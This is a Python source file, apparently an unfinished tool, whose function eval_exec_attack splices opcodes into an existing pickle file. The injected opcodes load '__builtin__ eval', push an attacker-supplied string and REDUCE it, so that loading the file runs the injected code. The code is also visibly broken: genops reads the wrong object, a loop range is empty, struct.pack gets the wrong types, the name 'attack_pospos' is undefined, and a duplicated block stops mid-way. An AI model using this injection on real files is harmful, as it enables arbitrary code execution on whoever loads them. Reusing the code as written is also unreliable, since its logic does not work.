import pickle
import struct
from pickletools import genops
from pickletools import opcodes as opcode_library
from turtle import position

BINUNICODE = 21
TUPLE1 = 31
BINPUT = 49
LONG_BINPUT = 50
GLOBAL = 55
REDUCE = 57
EVAL_EXEC_MEMO_LEN = 4
GLOBAL_END = b"\x0A"
BYTE_MAX = 0xFF


def get_all_commands(in_pickle):
    opcodes = []
    args = []
    positions = []
    for opcode, arg, pos in genops(pickle):
        opcodes.append(opcode)
        args.append(arg)
        positions.append(pos)

    return opcodes, args, positions


def eval_exec_attack(in_pickle, attack_str, attack_index, out_file):
    """
    Injects a string that is presumed to have an attack exec statement
    """
    
    # First, extract every command from the pickle file
    opcodes, args, positions = get_all_commands(in_pickle)

    # Next find what memo record, if any, we left off on
    last_memo_index = None
    for i in range(attack_index):
        if opcodes[i].name == "BINPUT":
            last_memo_index = args[i]

    # Increment the remaining memo records
    saw_memo_record = False
    for i in range(attack_index, -1):
        if opcodes[i].name == "BINPUT":
            saw_memo_record = True
            args[i] += EVAL_EXEC_MEMO_LEN

    # Define where we're attacking
    attack_pos = positions[attack_index]

    # Next, copy everything from the previous pickle file into a new file
    out_pickle = open(out_file, "ab")
    in_pickle.seek(0)
    out_pickle.write(in_pickle.read(attack_pos))

    # Inject our attack
    if last_memo_index is not None or saw_memo_record:
        # GLOBAL     '__builtin__ eval'
        out_pickle.write(opcode_library[GLOBAL].code)
        out_pickle.write("__builtin__ eval".encode('utf-8'))
        out_pickle.write(GLOBAL_END)

        # BINPUT/LONG_BINPUT     N
        memo_opcode = BINPUT if last_memo_index <= BYTE_MAX else LONG_BINPUT
        memo_index = struct.pack("<c", last_memo_index) if last_memo_index < BYTE_MAX else struct.pack("<L", last_memo_index)
        out_pickle.write(opcode_library[memo_opcode].code)
        out_pickle.write(memo_index)

        # BINUNICODE     ATTACK_STRING
        attack_bytes = attack_str.encode('utf-8')
        out_pickle.write(opcode_library[BINUNICODE].code)
        out_pickle.write(struct.pack("<L", len(attack_bytes)))
        out_pickle.write(attack_bytes)

        # BINPUT/LONG_BINPUT     N + 1
        memo_opcode = BINPUT if last_memo_index + 1 <= BYTE_MAX else LONG_BINPUT
        memo_index = struct.pack("<c", last_memo_index + 1) if last_memo_index + 1 < BYTE_MAX else struct.pack("<L", last_memo_index)
        out_pickle.write(opcode_library[memo_opcode].code)
        out_pickle.write(memo_index)

        # TUPLE1
        out_pickle.write(opcode_library[TUPLE1].code)

        # BINPUT/LONG_BINPUT     N + 2
        memo_opcode = BINPUT if last_memo_index + 2 <= BYTE_MAX else LONG_BINPUT
        memo_index = struct.pack("<c", last_memo_index + 2) if last_memo_index + 2 < BYTE_MAX else struct.pack("<L", last_memo_index)
        out_pickle.write(opcode_library[memo_opcode].code)
        out_pickle.write(memo_index)

        # REDUCE
        out_pickle.write(opcode_library[REDUCE].code)

        # BINPUT/LONG_BINPUT     N + 3
        memo_opcode = BINPUT if last_memo_index + 3 <= BYTE_MAX else LONG_BINPUT
        memo_index = struct.pack("<c", last_memo_index + 3) if last_memo_index + 3 < BYTE_MAX else struct.pack("<L", last_memo_index)
        out_pickle.write(opcode_library[memo_opcode].code)
        out_pickle.write(memo_index)
    else:
        pass






    attack_pos = positions[attack_index]
    if last_memo_index is not None or saw_memo_record:
        opcodes.insert(attack_index, opcode_library[GLOBAL])
        args.insert(attack_index, "__builtin__ eval")
        positions.insert(attack_index, attack_pospos)

        opcodes.insert(attack_index + 1, opcode_library[BINPUT])
        args.insert(attack_index + 1, "__builtin__ eval")
    